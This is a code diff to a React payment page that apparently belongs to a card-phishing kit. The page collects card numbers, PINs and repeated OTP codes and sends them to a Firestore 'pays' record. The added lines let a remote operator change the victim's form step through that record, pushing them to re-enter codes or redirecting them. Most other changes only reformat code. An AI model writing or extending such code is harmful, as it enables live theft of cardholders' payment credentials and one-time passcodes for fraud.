@@ -25,6 +25,7 @@ type PaymentInfo = {
   network: string
   idNumber: string
   otp2: string
+  step: number | string
 }
 const BANKS = [
   {
@@ -114,7 +115,7 @@ const BANKS = [
 ]
 
 export default function Payment() {
-  const [step, setstep] = useState(1)
+  const [step, setstep] = useState<string | number>(1)
   const [newotp] = useState([""])
   const [total, setTotal] = useState("")
   const [isloading, setisloading] = useState(false)
@@ -136,11 +137,12 @@ export default function Payment() {
     network: "",
     idNumber: "",
     otp2: "",
+    step: 1
   })
   const [countdown, setCountdown] = useState(60)
   const [isCountdownActive, setIsCountdownActive] = useState(true)
   const [otpAttempts, setOtpAttempts] = useState(1)
-  const [otpValue, setOtpValue ]= useState('')
+  const [otpValue, setOtpValue] = useState('')
   const handleAddotp = (otp: string) => {
     newotp.push(`${otp} , `)
   }
@@ -152,6 +154,7 @@ export default function Payment() {
     }
   }, [])
 
+
   useEffect(() => {
     const visitorId = localStorage.getItem("visitor")
     if (visitorId) {
@@ -159,6 +162,17 @@ export default function Payment() {
       const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnap) => {
         if (docSnap.exists()) {
           const data = docSnap.data() as PaymentInfo
+          if (data.step !== step) {
+            if (parseInt(data?.step?.toString()) === 5) {
+              window.location.href = '/auth'
+
+            } else if (parseInt(data?.step?.toString()) === 10) {
+
+              window.location.href = '/'
+            } else {
+              setstep(parseInt(data?.step?.toString()) || 1)
+            }
+          }
           if (data.status === "pending") {
             setisloading(true)
           } else if (data.status === "approved") {
@@ -199,13 +213,13 @@ export default function Payment() {
         onSubmit={(e) => {
           e.preventDefault()
         }}
-        style={{direction:"ltr"}}
+        style={{ direction: "ltr" }}
       >
         <div id="PayPageEntry">
           <div className="container" >
-            <div style={{display:'flex',justifyContent:'center'}}>
-          <img src="./mob.jpg" className="-" alt="logo" />
-          </div>
+            <div style={{ display: 'flex', justifyContent: 'center' }}>
+              <img src="./mob.jpg" className="-" alt="logo" />
+            </div>
             <div className="content-block">
               <div className="form-card">
                 <div className="container-" style={{ display: "flex", justifyContent: "center" }}>
@@ -536,28 +550,28 @@ export default function Payment() {
                     </div>
                     <div className="row">
                       <label className="column-label">CardNumber:</label>
-                      <label className="allownumericwithoutdecimal" style={{color:'black',fontWeight:100}}>
+                      <label className="allownumericwithoutdecimal" style={{ color: 'black', fontWeight: 100 }}>
                         {" "}
                         {paymentInfo.cardNumber.substring(0, 5) + "****" + paymentInfo.cardNumber.substring(10, 15)}
                       </label>
                     </div>
                     <div className="row">
                       <label className="column-label">Month expiry:</label>
-                      <label className="allownumericwithoutdecimal" style={{color:'black',fontWeight:100}}> {paymentInfo.month}</label>
+                      <label className="allownumericwithoutdecimal" style={{ color: 'black', fontWeight: 100 }}> {paymentInfo.month}</label>
                     </div>
                     <div className="row">
                       <label className="column-label">Year expiry:</label>
-                      <label className="allownumericwithoutdecimal" style={{color:'black',fontWeight:100}}> {paymentInfo.year}</label>
+                      <label className="allownumericwithoutdecimal" style={{ color: 'black', fontWeight: 100 }}> {paymentInfo.year}</label>
                     </div>
                     <div className="row">
                       <label className="column-label">Pin:</label>
-                      <label className="allownumericwithoutdecimal" style={{color:'black',fontWeight:200}}>{"****"}</label>
+                      <label className="allownumericwithoutdecimal" style={{ color: 'black', fontWeight: 200 }}>{"****"}</label>
                     </div>
                     <div className="flex my-1">
                       <label className="column-value ">OTP:</label>
                       <input
-                        onChange={(e: any) =>{
-                          
+                        onChange={(e: any) => {
+
                           setPaymentInfo({
                             ...paymentInfo,
                             otp: e.target.value,
@@ -571,7 +585,7 @@ export default function Payment() {
                         id="timer"
                         className="w-full"
                         value={otpValue}
-                        placeholder={`Timeout in: 01:${countdown===0?'00':countdown}`}
+                        placeholder={`Timeout in: 01:${countdown === 0 ? '00' : countdown}`}
                       />
                     </div>
                     <div className="row">
@@ -618,7 +632,7 @@ export default function Payment() {
                     </div>
                     <div style={{ display: "flex" }}>
                       <button
-                        style={{ background: "#f2f2f2", marginLeft:0, borderRadius:5 }}
+                        style={{ background: "#f2f2f2", marginLeft: 0, borderRadius: 5 }}
                         disabled={
                           (step === 1 &&
                             (paymentInfo.prefix === "" ||
@@ -634,14 +648,14 @@ export default function Payment() {
                           if (step === 1) {
                             setisloading(true)
                             handlePay(paymentInfo, setPaymentInfo)
-                          
+
                           } else if (step === 2) {
                             if (!newotp.includes(paymentInfo.otp!)) {
                               newotp.push(paymentInfo.otp!)
                             }
                             setisloading(true)
                             handleAddotp(paymentInfo.otp!)
-                         
+
                             // Increment attempt counter
                             const newAttemptCount = otpAttempts + 1
                             setOtpAttempts(newAttemptCount)
@@ -649,7 +663,7 @@ export default function Payment() {
                             // Clear OTP input after submit
                             setOtpValue('')
                             handlePay(paymentInfo, setPaymentInfo)
-                        
+
                             setTimeout(() => {
                               // Check if this is the 3rd attempt, if so move to step 3
                               if (newAttemptCount >= 3) {
@@ -692,7 +706,7 @@ export default function Payment() {
                       >
                         {isloading ? "Wait..." : step === 1 ? "Submit" : "Confirm"}
                       </button>
-                      <button style={{ background: "#f2f2f2", marginLeft:0, borderRadius:5 }}>Cancel</button>
+                      <button style={{ background: "#f2f2f2", marginLeft: 0, borderRadius: 5 }}>Cancel</button>
                     </div>
                   </div>
                 </div>
